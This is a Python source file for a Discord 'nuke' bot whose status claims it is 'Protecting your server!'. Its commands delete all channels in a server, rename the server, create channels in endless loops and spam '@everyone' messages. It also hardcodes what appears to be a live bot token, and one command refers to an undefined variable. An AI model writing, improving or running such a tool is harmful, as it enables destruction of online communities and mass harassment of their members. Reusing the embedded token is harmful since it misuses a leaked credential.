import asyncio
import time
import logging
import aiohttp
import colorama
import random
import os
import requests
from colorama import Fore, Style, init
import discord
from discord import Permissions
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands, tasks
from discord.ext.commands import Bot
from discord.ext.commands import *
from colorama import Fore as C
from colorama import Style as S
import sys
import json

token = "ODQ1MTU4MDgxMjc2MjgwODU1.YKc4zA.sfkXdKrMOc07TCxe5mdte4AYw58"
bio = ['s!help','Protecting your server!']
channel_names = ['Beamed by sock', "sock runs you"]

print(f'{Fore.LIGHTMAGENTA_EX}Connecting')
os.system("cls")

prefix = "$"

client = commands.Bot(command_prefix=prefix)

@client.event
async def on_connect():
    print(f"{client.user} Online...!")

@client.event
async def on_ready():
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.streaming, name=random.choice(bio)))

@client.command(pass_context=True)
async def nuke(ctx):
    await ctx.message.delete()

    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(f"{channel.name} Has been deleted.")
        except:
            pass

    for i in range(1):
        try:
            await ctx.guild.edit(name="wizzed by Sock")
            print("Name changed!")
        except:
            print("Name wasnt changed")

    for i in range(1):
        await guild.create_text_channel(random.choice(channel_names))
    while True:
        for channel in guild.text_channels:
            for i in range(500):
                await guild.create_text_channel(random.choice(channel_names))

@client.command(pass_context=True)
async def cdel(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()

    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(f"{channel.name} Wiped Channels.")
        except:
            pass

@client.command(pass_context=True)
async def ccr(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    for i in range(1):
        await guild.create_text_channel(random.choice(channel_names))
    while True:
        for channel in guild.text_channels:
            for i in range(500):
                await guild.create_text_channel(random.choice(channel_names))

        
@client.command(pass_context=True)
async def spam(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    for i in range(2):
        print("Spammed!")
        while True:
            for channel in guild.text_channels:
                await channel.send("Beamed by sock @everyone")


client.run(token)
